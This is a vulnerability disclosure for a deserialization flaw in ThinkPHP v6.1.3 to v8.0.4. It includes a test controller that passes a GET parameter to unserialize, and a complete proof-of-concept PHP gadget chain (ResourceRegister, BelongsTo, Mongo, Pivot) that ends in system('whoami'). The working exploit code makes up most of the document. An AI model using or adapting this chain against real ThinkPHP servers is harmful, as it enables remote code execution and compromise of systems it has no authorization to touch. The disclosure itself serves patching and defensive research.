## Vulnerability description

A deserialization vulnerability in Thinkphp v6.1.3 to v8.0.4 allows attackers to execute arbitrary code.

By triggering the __call method of the Mongo class

 

## Affects Version



Thinkphp v6.1.3 to v8.0.4

## Vulnerability certificate

php8.0.2 thinkphp v8.0.0



First, add new deserialization endpoint in app\controller\Index.php, such as:

```php
<?php

namespace app\controller;

use app\BaseController;

class Index extends BaseController
{
    public function index()
    {
        unserialize($_GET['lll']);
        return '<style>*{ padding: 0; margin: 0; }</style><iframe src="https://www.thinkphp.cn/welcome?version=' . \think\facade\App::version() . '" width="100%" height="100%" frameborder="0" scrolling="auto"></iframe>';
    }

}
```



POC

```
<?php

namespace think\db;
class Mongo{
}

namespace think;

abstract class Model
{

    private $data = [];
    private $withAttr = [];
    protected $json = [];
    protected $jsonAssoc = true;
    private $lazySave;
    protected $withEvent;
    private $exists;
    private $force;
    protected $table;
    protected $connection;
    function __construct()
    {
        $this->data["lll"]=["whoami"];
        $this->withAttr["lll"]=["system"];
        $this->json=["lll"];
        $this->lazySave = true;
        $this->withEvent = false;
        $this->exists = true;
        $this->force = true;
        $this->jsonAssoc = true;

    }
}
namespace think\model\relation;
use think\model\Pivot;
use think\db\Mongo;


class BelongsTo{
    protected $query;
    protected $parent;
    protected $foreignKey;
    function __construct(){
        $this->query=true;
        $this->parent=new Mongo();
        $this->foreignKey=new Pivot();
    }

}

namespace think\model;

use think\Model;

class Pivot extends Model
{
}


namespace think\route;
use think\model\relation\BelongsTo;

class ResourceRegister
{
    protected $registered = false;
    protected $resource;
    protected $db;
    function __construct()
    {
        $this->registered=false;
        $this->resource=new BelongsTo();
    }
}


namespace think;
use think\route\ResourceRegister;
$r=new ResourceRegister();
echo urlencode(serialize($r));

```



![image-20240912111225920](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240912111225920.png)
